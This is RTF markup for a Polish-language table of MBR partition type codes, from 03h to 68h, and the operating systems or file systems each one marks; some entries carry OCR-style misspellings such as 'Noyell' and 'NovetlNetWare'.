\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx5796
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}03h    XENIX /usr}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:5; bot-attach:6; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx5796
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}04h    DOSl6-bitFAT(do32M)}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:6; bot-attach:7; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx5796
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}05h    DOS 3.3+ rozszerzona partycja}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:7; bot-attach:8; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx5796
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}06h    DOS 3.31 + Large File System (16-bit FAT)}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:8; bot-attach:9; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx5796
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}07h    QNX}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:9; bot-attach:10; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx5796
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}07h    OS/2 HPFS}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:10; bot-attach:11; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx5796
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}07h    Windows NT NTFS}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:11; bot-attach:12; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx5796
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}07h    Advanced Unix}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:12; bot-attach:13; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx5796
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}08h    OS/2 (tylko v1.0-1.3)}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:13; bot-attach:14; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx5796
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}08h    AIX}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:14; bot-attach:15; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx5796
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}08h    Commodore DOS}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:15; bot-attach:16; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx5796
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}08h    DELL}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:16; bot-attach:17; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx5796
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}09h    AIX}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:17; bot-attach:18; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx5796
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}09h    Coherent}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:18; bot-attach:19; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx5796
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}0Ah    OS/2 Boot Manager}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:19; bot-attach:20; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx5796
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}0Ah    OPUS}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:20; bot-attach:21; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx5796
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}0Ah    Coherent}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:21; bot-attach:22; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx5796
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}0Bh    Windows 95 - 32-bit FAT}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:22; bot-attach:23; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx5796
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}0Ch    Windows 95 - 32-bit FAT (LBA)}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:23; bot-attach:24; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx5796
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}0Eh    zarezerwowane przez Microsoft dla VFAT}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:24; bot-attach:25; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx5796
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}0Fh    zarezerwowane przez Microsoft dla VFAT}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:25; bot-attach:26; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx5796
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}10h    OPUS}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:26; bot-attach:27; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx5796
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}11h    OS/2 Boot Manager 12-bit FAT}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:27; bot-attach:28; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx5796
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}12h    partycja Compaq Diagnostics}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:28; bot-attach:29; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx5796
\pard\plain\ltrpar\ql\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}14h    tworzy j\uc1\u261\'b9 Noyell DOS 7.0 FDISK}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:29; bot-attach:30; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx5796
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}14h    OS/2 Boot Manager}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:30; bot-attach:31; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx5796
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}16h    OS/2 Boot Manager}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:31; bot-attach:32; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx5796
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}17h    OS/2 Boot Manager HPFS}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:32; bot-attach:33; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx5796
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}18h    AST Windows plik wymiany}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:33; bot-attach:34; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx5796
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}21h    zarezerwowana}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:34; bot-attach:35; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx5796
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}23h    zarezerwowana}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:35; bot-attach:36; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx5796
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}24h    NEC MS-DOS 3.x}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:36; bot-attach:37; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx5796
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}26h    zarezerwowana}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:37; bot-attach:38; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx5796
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}31h    zarezerwowana}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:38; bot-attach:39; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx5796
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}33h    zarezerwowana}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:39; bot-attach:40; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx5796
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}34h    zarezerwowana}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:40; bot-attach:41; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx5796
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}36h    zarezerwowana}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:41; bot-attach:42; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx5796
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}3Ch    PowerQuest}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:42; bot-attach:43; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx5796
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}40h    VENIX 80286}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:43; bot-attach:44; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx5796
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}41h    Persona! RISC Boot}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:44; bot-attach:45; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx5796
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}42h    SFS (Secure File System)}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:45; bot-attach:46; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx5796
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}50h    OnTrack Disk Manager}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:46; bot-attach:47; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx5796
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}51h    OnTrack Disk Manager}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:47; bot-attach:48; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx5796
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}51h    NOYELL}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:48; bot-attach:49; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx5796
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}52h    CP/M}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:49; bot-attach:50; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx5796
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}52h    Microport System V/386}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:50; bot-attach:51; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx5796
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}53h    OnTrack Disk Manager}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:51; bot-attach:52; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx5796
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}54h    OnTrack Disk Manager (DDO)}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:52; bot-attach:53; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx5796
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}56h    GoldenBow VFeature}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:53; bot-attach:54; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx5796
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}61h    SpeedStor}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:54; bot-attach:55; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx5796
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}63h    Unix SysV/386}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:55; bot-attach:56; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx5796
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}63h    Mach}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:56; bot-attach:57; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx5796
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}64h    Novell NelWare 286}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:57; bot-attach:58; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx5796
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}65h    NovetlNetWare(3.11)}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:58; bot-attach:59; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx5796
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}67h    Novell}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:59; bot-attach:60; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx5796
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}68h    Novell}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:60; bot-attach:61; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx5796
